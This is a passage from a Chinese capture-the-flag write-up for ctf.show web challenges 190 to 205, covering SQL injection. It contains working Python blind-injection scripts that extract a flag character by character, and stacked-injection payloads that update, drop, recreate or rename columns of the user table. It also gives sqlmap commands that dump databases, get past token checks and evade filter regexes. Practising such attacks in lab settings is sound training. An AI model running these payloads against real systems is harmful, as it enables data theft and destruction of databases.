flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="0x02-9"><a href="#0x02-9" class="headerlink" title="0x02"></a>0x02</h3><p>利用二分法ASCII来写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://36e8713a-b1fb-49c2-badb-4c4d66f5d1cb.challenge.ctf.show/api/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        mid = (<span class="hljs-built_in">max</span>+<span class="hljs-built_in">min</span>)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == mid):<br>            flag += <span class="hljs-built_in">chr</span>(mid)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_web</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_fl0g</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#id,f1ag</span><br>        payload = <span class="hljs-string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:payload,<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-number">0</span>,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;8bef&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = mid <br></code></pre></td></tr></table></figure><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>本题过滤了ASCII，可以继续web190的0x01</p><h3 id="0x01-10"><a href="#0x01-10" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://42161408-1017-4aef-83ce-c22452b3d107.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="0x02-10"><a href="#0x02-10" class="headerlink" title="0x02"></a>0x02</h3><p>官方的思路是希望用ASCII改成ord来写脚本的，这里学一下两个的区别，脚本就直接贴了</p><p>ORD() 函数返回字符串第一个字符的ASCII 值，如果该字符是一个多字节（即一个或多个字节的序列），则MySQL函数将返回最左边字符的代码。如果字符不是多字节字符，则ORD()和ASCII()函数返回相似的结果；如果字符是多字节字符，则ASCII()只返回该字符最左侧的一个字节的ASCII值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://60a3f535-f0c5-40d6-9e63-fe058bf95762.challenge.ctf.show/api/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        mid = (<span class="hljs-built_in">max</span>+<span class="hljs-built_in">min</span>)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == mid):<br>            flag += <span class="hljs-built_in">chr</span>(mid)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_web</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_fl0g</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#id,f1ag</span><br>        payload = <span class="hljs-string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:payload,<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-number">0</span>,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;8bef&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = mid <br></code></pre></td></tr></table></figure><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>本题多过滤了ord和hex函数，还是可以继续用上面的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://6fec3a09-c862-4062-9893-f46b784267f2.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>这题过滤了substr，问题不大，用left，right或者mid就可以了，flag换到了<code>ctfshow_flxg</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://8a35e846-e2ed-464b-9843-19e404a9158d.challenge.ctf.show//api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_flxg\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_flxg&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(mid((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>多过滤了char|left|right|substring这些，上题的脚本继续用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://5d33d7d6-6708-4e4a-82ed-38708c8d1276.challenge.ctf.show//api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_flxg\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_flxg&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(mid((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="hljs-variable">$username</span>))<br></code></pre></td></tr></table></figure><p>这题又限制的比较死了，本题开始用堆叠注入，反引号利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1;update`ctfshow_user`<span class="hljs-built_in">set</span>`pass`=1&amp;password=1<br></code></pre></td></tr></table></figure><p>然后使用,抓包得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1&amp;password=0<br></code></pre></td></tr></table></figure><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>本题的题目中标明了select已经被过滤了，但是实际上并没有被过滤，orz出题人的问题吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1;<span class="hljs-keyword">select</span>(1)<br></code></pre></td></tr></table></figure><p>执行 <code>select(1)</code> 使记录返回1所以前面的 select pass 就被顶掉。如果不是堆叠注入的话, 需要让前面报错 (即查不到结果), 这样才能返回 union 后的查询内容</p><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><h3 id="0x01-11"><a href="#0x01-11" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1;show tables&amp;password=ctfshow_user<br></code></pre></td></tr></table></figure><p>根据给的语法，如果前面执行就会爆出所有的表，其中肯定有表是<code>ctfshow_user</code>，利用这点进行绕过</p><h3 id="0x02-11"><a href="#0x02-11" class="headerlink" title="0x02"></a>0x02</h3><p>可以进行删表另建的方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> ctfshow_user;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> ctfshow_user(username <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),pass <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>));<span class="hljs-keyword">insert</span> ctfshow_user <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><h3 id="0x01-12"><a href="#0x01-12" class="headerlink" title="0x01"></a>0x01</h3><p>方法同web197的一样</p><h3 id="0x02-12"><a href="#0x02-12" class="headerlink" title="0x02"></a>0x02</h3><p>本题过滤了drop和create,可以考虑进行列名互换将username和pass进行互换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><p>这里引入了一个第三值进行交换，类似算法里那种简单的互换，然后（userAUTO是已知的前面题目都有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=0&amp;password=userAUTO<br></code></pre></td></tr></table></figure><h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><h3 id="0x01-13"><a href="#0x01-13" class="headerlink" title="0x01"></a>0x01</h3><p>方法同web197</p><h3 id="0x02-13"><a href="#0x02-13" class="headerlink" title="0x02"></a>0x02</h3><p>过滤了括号，限制了之前payload中的varchar(100)，可以改为text。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` text;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` text;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` text;<br></code></pre></td></tr></table></figure><p>然后的同上一题</p><h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>增加了逗号的过滤，不影响做题，做法同web199。</p><h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>从201开始进行sqlmap的教学</p><p>先随便输入一个数字，看一下网络的具体回显，对应具体的接口是在&#x2F;api&#x2F;?id&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show --dbs<br></code></pre></td></tr></table></figure><p>先爆个库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></table></figure><p>对应进行爆表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show -t ctfshow_user --dump<br></code></pre></td></tr></table></figure><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>提示调整请求方式，那应该就是post</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show --dbs<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>使用–method 调整sqlmap的请求方式</p><p>指定<code>--method=PUT</code>方法，同时加上<code>-headers=&quot;Content-Type:text/plain</code>，否则put接受不了。同时，要加上index.php，<code>url/api/index.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> --dbs<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> -D ctfshow_web --tables <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p> 使用–cookie 提交cookie数据，加了一层这样的限制</p><p>看cookie可以先输入一个1，然后看网络回显，或者就是抓包看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://dae0632d-d227-454f-a5c7-822e63c2e162.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=1eseotn7nrl1lul9mj95mf7ogs; ctfshow=686a4e14cd97f8a312d042c1af086a90&quot;</span> --dbs  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://dae0632d-d227-454f-a5c7-822e63c2e162.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=1eseotn7nrl1lul9mj95mf7ogs; ctfshow=686a4e14cd97f8a312d042c1af086a90&quot;</span> -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>api调用需要鉴权</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-22195210.png" alt="2024-09-22195210"></p><p>可以看到需要先请求api&#x2F;getToken.php才能正常的发送</p><p>因此需要设置两个参数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">--safe-url 设置在测试目标地址前访问的安全链接<br>--safe-freq 设置两次注入测试前访问安全链接的次数<br></code></pre></td></tr></table></figure><p>这两个选项组合使用，可以有效应对基于会话、验证码或者防护机制的 Web 应用环境中的注入攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 